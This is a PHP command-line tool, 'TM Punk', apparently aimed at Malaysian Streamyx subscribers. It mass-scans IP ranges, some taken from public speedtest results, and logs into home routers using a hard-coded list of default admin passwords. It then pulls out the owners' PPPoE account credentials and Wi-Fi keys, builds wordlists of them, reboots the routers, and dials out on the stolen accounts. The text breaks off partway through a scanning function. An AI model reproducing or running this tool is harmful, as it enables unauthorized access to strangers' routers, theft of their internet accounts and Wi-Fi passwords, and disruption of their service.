<?php

/*

LICENSE

TM Punk Copyright (C) 2014 Mohd Shahril

This program is free software: you can redistribute it and/or modify it 
under the terms of the GNU General Public License as published by the Free 
Software Foundation, either version 3 of the License, or (at your option) 
any later version.

This program is distributed in the hope that it will be useful, but WITHOUT 
ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS 
FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along 
with this program. If not, see http://www.gnu.org/licenses/.

mohd_shahril_96 at yahoo dot com

*/

//
// Debug Mode
//
// Sometime script can't run, just set true this section to see the
// error and fix it yourself. ;)
// otherwise set false
//
$debug_mode = false;

//
// Set this php year.
//
define('year', '2013');

//
// Set this php version :).
//
define('version', '1.1');

//
// Set this script release date.
// Note : Year-Day-Month
//
define('released', '2013-11-23');

//
// Author for this script ;).
//
define('author', 'Shahril-Munajaf-Akif');

//
// Set if you want to make verbose as default.
//
$verbose = false;

//
// This section will decide if TMPunk want to output error or not..
//
if (!$debug_mode) {
  error_reporting(0);
  set_time_limit(0);
  ini_set('error_log',NULL);
  ini_set('max_execution_time',0);
  ini_set('log_errors',0);
} else {
  error_reporting(E_ALL);
  ini_set('display_errors','On');
  ini_set('error_log','my_file.log');
  ini_set('error_log','');
  ini_set('error_log','/dev/null'); #linux
}

date_default_timezone_set('Asia/Kuala_Lumpur');  // Here is important for new PHP version.

// Check if user trying to run this script on http server, if true, the die () with this error
if (PHP_SAPI != 'cli') die("This PHP isn't intend to be run on HTTP Web Server! Use PHP CLI instead.");

// Check if curl is installed on user PHP
if (!in_array('curl', get_loaded_extensions())) die("\nCurl Library must be installed or enabled to use TMPunk!\n");

$il=0; // Use in save/log function

//
// CopyRighT ;)
//
echo "\n".' TM Punk '.version.'  Copyright (c) '.year.' '.author.' '.released."\n";




//
// Settings
//

$connectfile_retry_sec = 30;  // set seconds before another redail attempt

$dl_auto_rnge = 1000; // -auto downstream range.. :)

// Auto collect wifi password from router and create wordlist
$wifi_pass_collect = false; //If you want this feature, then set true
$wifi_pass_filename = 'wifi-pass.txt';

// Auto collect streamyx username & password and create wordlist
$autocollect_bool = false;  //If you want this feature, then set true
$autocollect_filename = 'streamyx-list.txt';
$autocollect_range = 3000; //Range streamyx downstream to collect

//
// End Optional Settings
//




//
// List of another verification if default verification is fail.
// Note : username => password
//
$list = array(
    "admin" => "tmadmin",
    "tmadmin" => "admin",
    "admin" => "admin",
    "tmuser" => "tmuser",
    "tmbusiness" => "tmbusiness",
    "tmuser" => "tmbusiness",
    "tmadmin" => "tmbusiness",
    "support" => "support"
    );
    
//
// Version
// Give note for what you has done to this script.
//
if (isset ($argv[1]) && $argv[1] == "-v") {
  die("
    \r Version 0.1 :-
    \r - Base Code Written.
    \r - Only can detect what router user use only.

    \r Version 0.2 :-
    \r - Added automatic login code into D-Link, Innacom and Zyxel.

    \r Version 0.3 :-
    \r - Added save into log function (Thank to Akif)
    \r - More interactive help.

    \r Version 0.4 :-
    \r - Added ASUS DSL-N12U automatic login code.
    \r - Added multiple verification if default verification fail.

    \r Version 0.5 :-
    \r - Changed Curl User Agent into Chrome 23.
    \r - Added Streamyx Account Validation Scanner to check
    \r   if that streamyx account
    \r   can login into streamyx web mail.
    \r - Added TP-Link automatic login code.

    \r Version 0.6 :-
    \r - Added User Limit (user can now get what limit of
    \r   downstream that user want).
    \r - Fixed mistake when getting downstream/upstream on
    \r   TP-Link TD-W8901G.

    \r Version 0.7 :-
    \r - Added Router Reboot function (D-Link, Innacom and
    \r   TP-Link only !);

    \r Version 0.7.1 :-
    \r - Added Router Reboot function for Zyxel.

    \r Version 0.8 :-
    \r - Added verbose mode.

    \r Version 0.8.1 :-
    \r - Added Optional Info.

    \r Version 0.8.2 :-
    \r - Added ping timeout.
    \r - Added IP location tracker.

    \r Version 0.8.3 :-
    \r - Repaired file save function.
    \r - Minor change.
    
    \r Version 0.9 :-
    \r - Website checking for online or offline function is
    \r   now multithread.
    \r - Geo Location function is not default now. (You must
    \r   select it in options)
    \r - Script scanning speed now up to 50%. (thank to curl multithread).
    
    \r Version 0.9.1 :-
    \r - Minor Update (don't use much bandwidth for service
    \r   verification after this)
    
    \r Version 1.0 :-
    \r - Added auto streamyx connect (-con and -connect)
    \r   (for Windows user only!)
    
    \r Version 1.1 :-
    \r - Added auto scanning to make your life much more easier. (-auto)
    \r - Added wifi info extractor for Zyxel, Innacom and D-Link. (-wifi)
    \r - Added port scanner. (-pscan)
    \r - Added progress info while scanning. (including port scan)
    \r - User now can set their own multithread request. (-thread)
    \r - User also can set their own curl timeout. (-timeout)
    \r - Added error page and solution if TMPunk can't find any HTTP server
    \r   from given ip and range.
    \r - Implemented ICMP ping function.
    \r - User agent are randomly generate now.
    \r - Added new feature to connect streamyx account.
    \r - Added wifi pass & streamyx account collector.
    \r - Removed Streamyx Account Validator scanner.
    \r - Removed verbose option. (-verbose)
    \r - Code has been cleaned up a bit.
    \r - Fixed lots of bug and coding errors.

    \r Thank to : Akif (for log function) and other people to make this
    \r            script possible until this stage. :D
  ");
}

//
// Con (Connect) argument for reboot function
//
if (in_array("-con", $argv, true)) {

  // check if this script is running on Windows OS or not..
  if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') die("\nThis 'con' function only can be use in Windows OS only!\n");
  
  $con = true;
  $key = array_search("-con", $argv);
  if (!isset ($argv[$key+1])) {
    die("\nCon Error ! -> Must set connection name");
  }
  $value = $key + 1;
  $name_connect_con = $argv[$value];
}

//
// -connect-file argument.
//
if (in_array("-connect-file", $argv, true)) {

  $key_con = array_search("-connect-file", $argv);
  
  // error checking, check yourself for better understanding
  if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') die("\nThis function only can be use in Windows OS only!\n");
  if (empty ($argv[$key_con + 1])) die("\nPlease enter filename that list streamyx account !\n");
  if (!file_exists ($argv[$key_con + 1])) die("\nFile doesn't exist!\n");
  if (empty ($con)) die("\nYou must put -con argument !\n");
  
  $filename_connect = $argv[$key_con + 1];
  $file_data = preg_split('/$\R?^/m', file_get_contents ($filename_connect));  //regex to split new line (work on \r\n or \n)
  shuffle ($file_data);
  echo "\n";
  $tmp_txt = '';
  $cnt_con = 0;
  
  // this loop will test all account
  foreach ($file_data as $line) {
    $cnt_con++;
    if ($cnt_con > 1) {
      $time_con = $connectfile_retry_sec;
      $tmp_con_cnt = '';
      
      // if current account failed to connect, then rest for $time_con second and try another account..
      while(true) {
        if ($time_con <= 0) break;
        $tmp_con_cnt = "\r Error..dial using another account in {$time_con} sec..";
        echo $tmp_con_cnt;
        sleep(1);
        $time_con--;
        clear_screen_buffer ($tmp_con_cnt);
      }
      
    }
    $pecah = explode(":", $line);
    $tmp_txt = "\r Trying Username {$pecah[0]} and password {$pecah[1]}";
    echo $tmp_txt;
    $connect = rasdial ($name_connect_con, $pecah[0], $pecah[1]);
    if ($connect == "name" && $connect != 1) {
      die("\n\n'{$name_connect_con}' is not exist in this computer!\n");
    }else if ($connect == "already" && $connect != 1) {
      die("\n\n'{$name_connect_con}' is already connected!\n");
    }else if ($connect == "up" && $connect != 1) {
      clear_screen_buffer ($tmp_txt);
      continue;
    }else if ($connect == "651" && $connect != 1) {
        die("\n\n The modem (or other connecting device) has reported an error.\n");
    } else {
      die("\n\n Successful Connect!\n");
    }
  }
}

//
// This section is for -reboot argument
//
if (in_array("-reboot", $argv, true)) {
  $key = array_search("-reboot", $argv);
  $value = $key + 1;
  $ip = $argv[$value];
  
  // using regex vs inbuild function..inbuild function is better.. ;)
  if (!filter_var ($ip, FILTER_VALIDATE_IP)) { echo "\n Incorrect IP Address Format\n";die(); }
  
  if (check_old ($ip) != TRUE) { echo "\n IP address {$ip} dont exist :(\n";die(); }
  $data = http_request ($ip);
  $info_return = checkdata ($data);
  if ($info_return == "Innacom") {
    if ($con) { $data = Innacom ($ip); }
    $result = innacom_reboot ($ip);
    if ($result == true) {
      echo "\n {$ip} is rebooting now !\n";
    } else {
      echo "\n Error when TMPunk was trying to reboot router at {$ip}!\n";
    }
    if ($con) {
      preg_match('/User \: (.*)/', $data, $username);
      preg_match('/Pass \: (.*)/', $data, $password);
      $connect = rasdial ($name_connect_con, $username[1], $password[1]);
      if ($connect == "name" && $connect != 1) {
        echo "\n '{$name_connect_con}' is not exist in this computer!\n";
      }else if ($connect == "already" && $connect != 1) {
        echo "\n '{$name_connect_con}' is already connected!\n";
      }else if ($connect == "up" && $connect != 1) {
        echo "\n Username '{$username[1]}' and password '{$password[1]}' is not recognized!\n";
      }else if ($connect == "651" && $connect != 1) {
        echo "\n The modem (or other connecting device) has reported an error.\n";
      } else {
        echo "\n Successful Connect!\n";
      }
    }
  }else if ($info_return == "D-Link") {
    if (strpos ($data, "SEA_1.01")) {
      if ($con) { $data = dlink ($ip, "SEA_1.01"); }
      $result = dlink_reboot ($ip, "SEA_1.01");
    } else {
      if ($con) { $data = dlink ($ip, ""); }
      $result = dlink_reboot ($ip, "");
    }
    if ($result == true) {
      echo "\n {$ip} is rebooting now !\n";
    } else {
      echo "\n Error when trying to reboot Router at {$ip}!\n";
    }
    if ($con) {
      preg_match('/User \: (.*)/', $data, $username);
      preg_match('/Pass \: (.*)/', $data, $password);
      $connect = rasdial ($name_connect_con, $username[1], $password[1]);
      if ($connect == "name" && $connect != 1) {
        echo "\n '{$name_connect_con}' is not exist in this computer!\n";
      }else if ($connect == "already" && $connect != 1) {
        echo "\n '{$name_connect_con}' is already connected!\n";
      }else if ($connect == "up" && $connect != 1) {
        echo "\n Username '{$username[1]}' and password '{$password[1]}' is not recognized!\n";
      }else if ($connect == "651" && $connect != 1) {
        echo "\n The modem (or other connecting device) has reported an error.\n";
      } else {
        echo "\n Successful Connect!\n";
      }
    }
  }else if ($info_return == "TP-Link TD-W8901G") {
    if ($con) { $data = TpLink ($ip); }
    $result = TpLink_reboot ($ip);
    if ($result == true) {
      echo "\n {$ip} is rebooting now !\n";
    } else {
      echo "\n Error when trying to reboot Router at {$ip}!\n";
    }
    if ($con) {
      preg_match('/User \: (.*)/', $data, $username);
      preg_match('/Pass \: (.*)/', $data, $password);
      $connect = rasdial ($name_connect_con, $username[1], $password[1]);
      if ($connect == "name" && $connect != 1) {
        echo "\n '{$name_connect_con}' is not exist in this computer!\n";
      }else if ($connect == "already" && $connect != 1) {
        echo "\n '{$name_connect_con}' is already connected!\n";
      }else if ($connect == "up" && $connect != 1) {
        echo "\n Username '{$username[1]}' and password '{$password[1]}' is not recognized!\n";
      }else if ($connect == "651" && $connect != 1) {
        echo "\n The modem (or other connecting device) has reported an error.\n";
      } else {
        echo "\n Successful Connect!\n";
      }
    }
  }else if ($info_return == "Zyxel P-600") {
    if ($con) { $data = zyxel ($ip); }
    $result = zyxel_reboot ($ip);
    if ($result == true) {
      echo "\n {$ip} is rebooting now !\n";
    } else {
      echo "\n Error when trying to reboot Router at {$ip}!\n";
    }
    if ($con) {
      preg_match('/User \: (.*)/', $data, $username);
      preg_match('/Pass \: (.*)/', $data, $password);
      $connect = rasdial ($name_connect_con, $username[1], $password[1]);
      if ($connect == "name" && $connect != 1) {
        echo "\n '{$name_connect_con}' is not exist in this computer!\n";
      }else if ($connect == "already" && $connect != 1) {
        echo "\n '{$name_connect_con}' is already connected!\n";
      }else if ($connect == "up" && $connect != 1) {
        echo "\n Username '{$username[1]}' and password '{$password[1]}' is not recognized!\n";
      }else if ($connect == "651" && $connect != 1) {
        echo "\n The modem (or other connecting device) has reported an error.\n";
      } else {
        echo "\n Successful Connect!\n";
      }
    }
  } else {
    echo "\n Can't determine what Router for {$ip} :(\n";
  }
  die();
}

//
// This section is for -limit argument
//
if (in_array("-limit", $argv, true)) {

  // if -limit isn't used alongside scanner, then condition is false
  if (in_array("-ip", $argv, true) || in_array("-auto", $argv, true)) {
    $find_key = array_search("-limit", $argv);
    $limit_value = $find_key + 1;
    
    // here the if else..check yourself ;)
    if (strtolower ($argv[$limit_value]) == "4mb") {
      $limit_bool = "set";
    } else if (strtolower ($argv[$limit_value]) == "2mb") {
      $limit_bool = "set";
    } else if (strtolower ($argv[$limit_value]) == "8mb") {
      $limit_bool = "set";
    } else {
      echo "\n Make sure limit perimeter is 4mb or 2mb !\n";
      echo " Exiting!\n";
      sleep(1);
      die();
    }
  } else {
    die("\n-limit only can be use with scanner!\n");
  }
}

//
// Connect argument
// - This part of code is using rasdial function (Windows only!) to connect using PPPOE..
//
if (in_array("-connect", $argv, true)) {

  // check for condition..
  if (in_array("-reboot", $argv, true)) {
    
    // checking for OS..
    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') die("\nThis 'connect' function only can be use in Windows OS only!\n");
    
    $find_key = array_search("-connect", $argv);
    if (!isset ($argv[$find_key + 1]) || !isset ($argv[$find_key + 2]) || !isset ($argv[$find_key + 3])) {
      die("\nPlease make sure connect argument have 3 perimeter!\n");
    } else {
      $name_connect = $argv[$find_key + 1];
      $username_connect = $argv[$find_key + 2];
      $password_connect = $argv[$find_key + 3];
      $connect = rasdial ($name_connect, $username_connect, $password_connect);
      if ($connect == "name" && $connect != 1) {
        echo "\n '{$name_connect}' is not exist in this computer!\n";
      }else if ($connect == "already" && $connect != 1) {
        echo "\n '{$name_connect}' is already connected!\n";
      }else if ($connect == "up" && $connect != 1) {
        echo "\n Username '{$username_connect}' and password '{$password_connect}' is not recognized!\n";
      } else {
        echo "\n Successful Connect!\n";
      }
    }
  }else die("\n -connect isn't intend to be use with scanner or -reboot\n");
}

//
// Geolocation argument
//
 
if (in_array("-geol", $argv, true)) {
  if (in_array("-ip", $argv, true) || in_array("-auto", $argv, true)) {
    $geol = true;
  }else die("\n-geol only can be use with scanner!\n");
} else { $geol = false; } 

//
// Enable wifi password extractor..
//
if (in_array("-wifi", $argv, true)) {
  if (in_array("-ip", $argv, true) || in_array("-auto", $argv, true)) {
    $wifi = true;
  }else die("\n-wifi only can be use with scanner!\n");
} else { $wifi = false; }

//
// Enable port scanner..
//
if (in_array("-pscan", $argv, true)) {
  if (in_array("-ip", $argv, true) || in_array("-auto", $argv, true)) {
    $find_key = array_search("-pscan", $argv);
    $port_scan = (empty ($argv[$find_key+1])?'usual':$argv[$find_key+1]);
  }else die("\n-pscan only can be use with scanner!\n");
} else { $port_scan = false; }

//
// Take save file argument
//
 
if (in_array("-save", $argv, true)) {
  if (in_array("-ip", $argv, true) || in_array("-auto", $argv, true)) {
    $find_key = array_search("-save", $argv);
    $value = $find_key + 1;
    $filesave = $argv[$value];
  }else die("\n-save only can be use with scanner!\n");
} else {
  $filesave = '';
}

//
// If user want TM Punk to show optional info.
// Then this is section of it :)
//
if (in_array("-g", $argv, true)) {
  if (in_array("-ip", $argv, true) || in_array("-auto", $argv, true)) {
    $optional = true;
  }else die("\n-g only can be use with scanner!\n");
} else {
  $optional = false;
}

//
// Set PHP curl threads..
//
if (in_array("-thread", $argv, true)) {

  // if user don't set -thread, then TMPunk will use 254 as default..
  if (in_array("-ip", $argv, true) || in_array("-auto", $argv, true)) {
    $find_key = array_search("-thread", $argv);
    $value = $find_key + 1;
    $thread = $argv[$value];
  } else {
    die("\n-thread only can be use with scanner!\n");
  }
} else {
  $thread = 254;
}

//
// Set PHP curl timeout..
//
if (in_array("-timeout", $argv, true)) {

  // if user don't set -timeout, then TMPunk will use 10 as default..
  if (in_array("-ip", $argv, true) || in_array("-auto", $argv, true)) {
    $find_key = array_search("-timeout", $argv);
    $value = $find_key + 1;
    $timeout = $argv[$value];
  } else {
    die("\n-timeout only can be use with scanner!\n");
  }
} else {
  $timeout = 10;
}

//
// Take -auto argument
//
if (in_array("-auto", $argv, true)) {
  $ip = '1';
  $range = '1';
}

//
// Take IP and range code 
//

if (!in_array("-auto", $argv, true)) {
  if (in_array("-ip", $argv, true)) {
    $find_key = array_search("-ip", $argv);
    $value = $find_key + 1;
    $ip = $argv[$value];
  }
  if (in_array("-range", $argv, true)) {
    $find_key = array_search("-range", $argv);
    $value = $find_key + 1;
    $range = $argv[$value];
  }
}

//
// Help File
//
 
if (!isset ($argv[1]) || $argv[1] == "-help" || $argv[1] == "-h" || $argv[1] == "/?") {
  die("
    \r USAGE :
    \r php \"{$argv[0]}\" -auto
    \r php \"{$argv[0]}\" -ip <ip> -range <range> (optional) -save <filename>
    \r php \"{$argv[0]}\" -c <filename>
    \r php \"{$argv[0]}\" -ip <ip> -range <range> -limit \"4m\"
    \r php \"{$argv[0]}\" -ip <ip> -range <range> -save -limit \"2m\"
    \r php \"{$argv[0]}\" -reboot <ip>
     
    \r OPTIONS : 
    \r -ip <ip>   : Specific target IP.
    \r -range <range> : Range scanner need to scan.
    \r -auto : Automatic scan for you! (this one is gold for you!)
    
    \r ---------------------------------------------
    \r ALL BELOW IS JUST AN OPTIONAL. :)
    \r ---------------------------------------------
    
    \r SCANNING OPTION :
    \r -thread : Set your custom multithread here. (Default 255)
    \r -timeout : Set your own curl timeout. (Default is 10)
    \r -g : Get optional info that you must know. :)
    \r -save <filename> : Save result in specific file.
    \r -limit <speed> : Filter output from result. (In 2mb,4mb & 8mb).
    \r -geol : Get location of streamyx user.
    \r -wifi : Extract wifi info -> SSID, Wifi Key and Wifi Auth Mode.
    \r -pscan <range> : scan for commonly or user define port range.
    \r   note : If you didn't define any range, port scanner will scan
    \r          for commonly use port.
     
    \r OTHER MISCELLANEOUS :
    
    \r -v : Show what version of TM Punk you have now.
    \r -connect-file <filename> -con <name> : Use to trying connect each of
    \r                                        streamyx account. (use with -con!)
    \r -connect <name> <username> <password> : Use for creating PPPOE connection.
    \r -reboot <ip> : Automatically reboot those router ;).
    \r -con <name> : Use for creating PPPOE connection.
    \r               (for -reboot & -connect-file only!)
    ");
}

//
// Base Code
//
if (isset ($ip) && isset ($range)) {

  $condition = true; // this boolean is used store condition if scanning is return false
  
  if (in_array("-auto", $argv, true)) {
  
    // check speedtest.com.my server status
    if (!check_old('http://www.speedtest.com.my/latest_result.php')) die("\nCan't connect with speedtest.com.my ! Please try again later.\n");
    
    // if server don't offline, then start to get some random ip address..
    $cut = cutstr(file_get_contents('http://www.speedtest.com.my/latest_result.php'), 'System', '</table>');
    preg_match_all('/<tr>(.*?)<\/tr>/si', $cut, $out);
    foreach ($out[0] as $scan_ip) {
      preg_match_all('/top>(.*?)<\/td>/', $scan_ip, $ouut);
      if (strpos(cutstr ($ouut[1][1], 'size=1>', '<br>'), 'TM') !== false) {
        $tmp_cut = explode(' ', $ouut[1][2]);
        if ($tmp_cut[0] > $dl_auto_rnge) {
          $col_auto[] = cutstr ($ouut[1][1], 'Submit">', '</a>');
          continue;
        }
      }
    }
  }
  
  // check $condition boolean if there are any error while scanning..
  while ($condition) {
  
    if (in_array("-auto", $argv, true)) {
    
      // if speedtest.com.my don't give any IP address, then TMPunk will exit
      if (count ($col_auto) <= 0) die("\nCan't find any IP address that can be use for this scanning!\n");
      
      if (!in_array("-ip", $argv, true) || !in_array("-range", $argv, true)) {
        $r = array_rand ($col_auto);
        $ip = $col_auto[$r];
        unset ($col_auto[$r]);
        $range = '1-255';
      } else {
        die("\n-auto can't be used with -ip and -range!\n");
      }
    } else {
      $condition = false;
    }
    
    // check ip address format..
    if (!filter_var ($ip, FILTER_VALIDATE_IP)) {
      echo "\n Incorrect IP Address Format\n";
      die(); 
    }
    
    // check if range string contain '-' string
    if (strpos ($range, "-")) {
      $range_if = explode("-", $range);
    } else {
      echo "\n Incorrect Range Format\n";die();
    }
    
    // check for range input ( 255 :( )
    if ($range_if[1] > 255) {
      echo "\n Incorrect Range Format\n";
      die();
    }else if ($range_if[0] <= 0) {
      echo "\n Can't start range with 0!\n";
      die();
    }
    
    // here script will parse user input ip address
    $a = explode(".", $ip);
    $a = $a[0].".{$a[1]}.".$a[2];
    echo "\n Scanning {$a}.{$range}... \n\n";
    $b = explode("-", $range);
    $ole = range ($b[0], $b[1]);
    
    $ol = count ($ole); // this variable will count online ip address
    $give = "\r\n Status : Scan started for IP range {$a}.{$range}... ";
    
    // if user set to save result of scanning, here the code..
    if (!empty ($filesave)) file_put_contents ($filesave, $give, FILE_APPEND);
    
    $collect_ip = array(); // array to store ip that will be scan by TMPunk later
    
    // loop for user range input and store ip that need to be scan into $collect_ip
    for ($i = $range_if[0]; $i <= $range_if[1]; $i++) {
      $collect_ip[] = "http://{$a}.{$i}/";
    }
    
    // here the gold, php send array into check function ( multithread broohh.. !  ;) )
    $data_check_return = check ($collect_ip, $thread, $timeout);
    
    $online = array(); // array to store online ip address
    
    // checking data that has been returned by check function
    // if host online, then put it into $online variable
    foreach ($data_check_return as $b => $k) {
      if (!empty ($k)) {
        $online[] = $b + $range_if[0];
      }
    }
    
    // if TMpunk can't find any online host, this message will shown up
    // otherwise, continues with scanning
    if (empty ($online) && !$condition) {
      die("
        \r Can't find any HTTP server on {$a}.{$range}!
          
        \r For some users that had some problem with TMPunk, try to use some
        \r of this solutions and advises :-

        \r  1. Try to lower your multithreads by using -thread setting,
        \r     example is -thread 50.
        
        \r  2. Some users may have slow internet connection and their
        \r     ping time is decreases if they using large multithread
        \r     requests at the same time. Also, you can solve this problem
        \r     by increase your curl timeouts by using -timeout setting.
        \r     Example is : -timeout 90.
        \r     So, curl can wait much longer for response time from that
        \r     HTTP router server. The only bad effect is your scanning will
        \r     be much longer from usual.
        
        \r  3. If this problem still persist, and maybe you have damn
        \r     slow internet connection, you can use all above solution.
        ");
        
    } else {
    
      $cnt_scan=0; // this int variable is used by progress 
      
      foreach ($online as $i) {
      
        $cnt_scan++; // increment it for each loop
        
        // progress here ;)
        $store_tmp = "\r Scanning {$a}.{$i}... | Progress : ".sprintf("%.1f", (($cnt_scan/count ($online))*100))."%";
        
        echo $store_tmp; // print progress
        
        // send to checkdata function for router verification
        $data_return = checkdata ($data_check_return[$i - $range_if[0]], $a.".".$i);
        
        if ($data_return == "Innacom")
        {
          // send ip address into innacom function for data extraction
          $tunjuk = Innacom ($a.".".$i, $filesave, $wifi);
          
          clear_screen_buffer ($store_tmp); // clear the screen for previous message
          
          // if user set limit for data output, then this section will do his work..
          if (isset ($limit_bool) && $limit_bool == "set") {
            $downstream = getdownstream ($tunjuk);
            if (limit ($downstream, $argv[$limit_value])) {
              $il++;
              echo " {$a}.{$i} is {$data_return}\n";
              echo " Ping time : ".ping ($a.".".$i)."\n";
              if ($geol) echo " Location : ".get_geolocation ($a.".".$i)."\n";
              echo $tunjuk;
              if ($port_scan) port_scan ($a.".".$i, $port_scan, $filesave);
              echo "\n";
            }
          }
          else  // if not set any limit, show the data..
          {
            $il++;
            echo " {$a}.{$i} is {$data_return}\n";
            echo " Ping time : ".ping ($a.".".$i)."\n";
            
            // geolocation ;)
            if ($geol) echo " Location : ".get_geolocation ($a.".".$i)."\n";
            
            echo $tunjuk;
            
            // portscan ;)
            if ($port_scan) port_scan ($a.".".$i, $port_scan, $filesave);
            
            echo "\n";
          }
        }
        else if ($data_return == "ASUS DSL-N12U")
        {
          // send ip address into asus function for data extraction
          $tunjuk = asus ($a.".".$i, $filesave, $wifi);
          
          clear_screen_buffer ($store_tmp);  // clear the screen for previous message
          
          // if user set limit for data output, then this section will do his work..
          if (isset ($limit_bool) && $limit_bool == "set") {
            $downstream = getdownstream ($tunjuk);
            if (limit ($downstream, $argv[$limit_value])) {
              $il++;
              echo " {$a}.{$i} is {$data_return}\n";
              echo " Ping time : ".ping ($a.".".$i)."\n";
              if ($geol) echo " Location : ".get_geolocation ($a.".".$i)."\n";
              echo $tunjuk;
              if ($port_scan) port_scan ($a.".".$i, $filesave);
              echo "\n";
            }
          } else { // if not set any limit, show the data..
            $il++;
            echo " {$a}.{$i} is {$data_return}\n";
            echo " Ping time : ".ping ($a.".".$i)."\n";
            
            // geolocation ;)
            if ($geol) echo " Location : ".get_geolocation ($a.".".$i)."\n";
            
            echo $tunjuk;
            
            // portscan ;)
            if ($port_scan) port_scan ($a.".".$i, $port_scan, $filesave);
            
            echo "\n";
          }
        }
        else if ($data_return == "TP-Link TD-W8901G")
        {
          // send ip address into tplink function for data extraction
          $tunjuk = TpLink ($a.".".$i, $filesave, $wifi);
          
          clear_screen_buffer ($store_tmp); // clear the screen for previous message
          
          // if user set limit for data output, then this section will do his work..
          if (isset ($limit_bool) && $limit_bool == "set") {
            $downstream = getdownstream ($tunjuk);
            if (limit ($downstream, $argv[$limit_value])) {
              $il++;
              echo " {$a}.{$i} is {$data_return}\n";
              echo " Ping time : ".ping ($a.".".$i)."\n";
              if ($geol) echo " Location : ".get_geolocation ($a.".".$i)."\n";
              echo $tunjuk;
              if ($port_scan) port_scan ($a.".".$i, $port_scan, $filesave);
              echo "\n";
            }
          } else { // if not set any limit, show the data..
            $il++;
            echo " {$a}.{$i} is {$data_return}\n";
            echo " Ping time : ".ping ($a.".".$i)."\n";
            
            // geolocation ;)
            if ($geol) echo " Location : ".get_geolocation ($a.".".$i)."\n";
            
            echo $tunjuk;
            
            // portscan ;)
            if ($port_scan) port_scan ($a.".".$i, $port_scan, $filesave);
            
            echo "\n";
          }
        }
        else if ($data_return == "D-Link")
        {  
          // check version of d-link router
          if (strpos ($data_check_return[$i - $range_if[0]], "SEA_1.01")) {
             // send ip address into dlink function for data extraction
            $tunjuk = dlink ($a.".".$i, "SEA_1.01", $filesave, $wifi);
          } else {
             // send ip address into dlink function for data extraction
            $tunjuk = dlink ($a.".".$i, "", $filesave, $wifi);
          }
          
          clear_screen_buffer ($store_tmp); // clear the screen for previous message
          
          // if user set limit for data output, then this section will do his work..
          if (isset ($limit_bool) && $limit_bool == "set") {
            $downstream = getdownstream ($tunjuk);
            if (limit ($downstream, $argv[$limit_value])) {
              $il++;
              echo " {$a}.{$i} is {$data_return}\n";
              echo " Ping time : ".ping ($a.".".$i)."\n";
              if ($geol) echo " Location : ".get_geolocation ($a.".".$i)."\n";
              echo $tunjuk;
              if ($port_scan) port_scan ($a.".".$i, $port_scan, $filesave);
              echo "\n";
            }
          } else { // if not set any limit, show the data..
            $il++;
            echo " {$a}.{$i} is {$data_return}\n";
            echo " Ping time : ".ping ($a.".".$i)."\n";
            
            // geolocation ;)
            if ($geol) echo " Location : ".get_geolocation ($a.".".$i)."\n";
            
            echo $tunjuk;
            
            // portscan ;)
            if ($port_scan) port_scan ($a.".".$i, $port_scan, $filesave);
            
            echo "\n";
          }
        }
        else if ($data_return == "Zyxel P-600")
        {  
          // send ip address into zyxel function for data extraction
          $tunjuk = zyxel ($a.".".$i, $filesave, $wifi);
          
          clear_screen_buffer ($store_tmp); // clear the screen for previous message
          
          // if user set limit for data output, then this section will do his work..
          if (isset ($limit_bool) && $limit_bool == "set") {
            $downstream = getdownstream ($tunjuk);
            if (limit ($downstream, $argv[$limit_value])) {
              $il++;
              echo " {$a}.{$i} is {$data_return}\n";
              echo " Ping time : ".ping ($a.".".$i)."\n";
              if ($geol) echo " Location : ".get_geolocation ($a.".".$i)."\n";
              echo $tunjuk;
              if ($port_scan) port_scan ($a.".".$i, $port_scan, $filesave);
              echo "\n";
            }
          } else { // if not set any limit, show the data..
            $il++;
            echo " {$a}.{$i} is {$data_return}\n";
            echo " Ping time : ".ping ($a.".".$i)."\n";
            
            // geolocation ;)
            if ($geol) echo " Location : ".get_geolocation ($a.".".$i)."\n";
            
            echo $tunjuk;
            
            // port scan.. ;)
            if ($port_scan) port_scan ($a.".".$i, $port_scan, $filesave);
            
            echo "\n";
          }
        }
        else
        {
          clear_screen_buffer ($store_tmp); // clear the screen for previous message
          
          // if no router has been found, so this section will do his work..
          if (isset ($data_return)) {
            if ($optional) {
              echo " {$a}.{$i} is {$data_return}\n";
              $il++;
              $give = "\r\n\r\nIP : {$a}.{$i}\r\nDevice : {$data_return}\r\nStatus : Method not implemented";
              if (!empty ($filesave)) file_put_contents ($filesave, $give, FILE_APPEND);
              echo "\n";
            }
          } else { 
            if ($optional) {
              $il++;
              echo " {$a}.{$i} exist but no data for this IP\n";
                $give = "\r\n\r\nIP : {$a}.{$i} \r\nDevice : unknown\r\nStatus : Unknown device";
                if (!empty ($filesave)) file_put_contents ($filesave, $give, FILE_APPEND);
              echo "\n";
            }
          }
        }
      }
      if ($il == 0) {
        
        // this section used by -auto
        if ($condition) {
          echo " No router found ! Searching another IP Address...\n";
          continue;
          
        } else {
        
          // if TMpunk can't find any router on given host, so this message will be print out..
          die(" 
          \r Can't find any router HTTP server on {$a}.{$range}!
          
           -Troubleshoot-
          
          \r  No streamyx known router is exist on that network. If
          \r  you want TMPunk to shown another devices such as webcam
          \r  while scanning, just add -g perimeter.
          
          ");
        }
      } else {
      
        // give the summary result..
        $give = " Status : Scan ended. Total there are {$il} IPs accessible out of
                \r          {$ol} IPs on range. \r\n";
        echo $give;
        if (!empty ($filesave)) file_put_contents ($filesave, "\r\n\r\n".$give, FILE_APPEND);
      }
      
      die();
    }
  }
}

//
// Check if IP inside an array is online
// - multithread
//
 
function check ($link_r, $thread, $timeout) {
  
  $data_split = array();
  
  // this code will split array of IP into section
  // some calculation is done here, you can check it yourself 
  if (count ($link_r) > $thread) {
    $calc = strval(count ($link_r)/$thread);
    $calc = explode(".", $calc);
    $calc = (int)$calc[0];
    $value = count ($link_r);
    $kira_data = 0;
    for ($i = 0;$i <= $calc;$i++) {
      if ($value == 0) break;
      $data_split[$i] = array();
      $kira = 0;
      while ($kira < $thread) {
        if ($value == 0) break;
        $data_split[$i][] = $link_r[$kira_data];
        $kira_data++;
        $kira++;
        $value = $value - 1;
      }
    }
  } else {
  
    // if array doesn't have to be split, then store all here..
    $data_split[0] = $link_r;
    
  }
 
  $collect_data_scan = array(); // array to store curl result
  
  for ($aa = 0;$aa < count ($data_split);$aa++) {
    $r_r = $data_split[$aa];
    $curly = array(); // to store curl handle
    $result = array(); // to store curl result for each loop
    $mh = curl_multi_init();
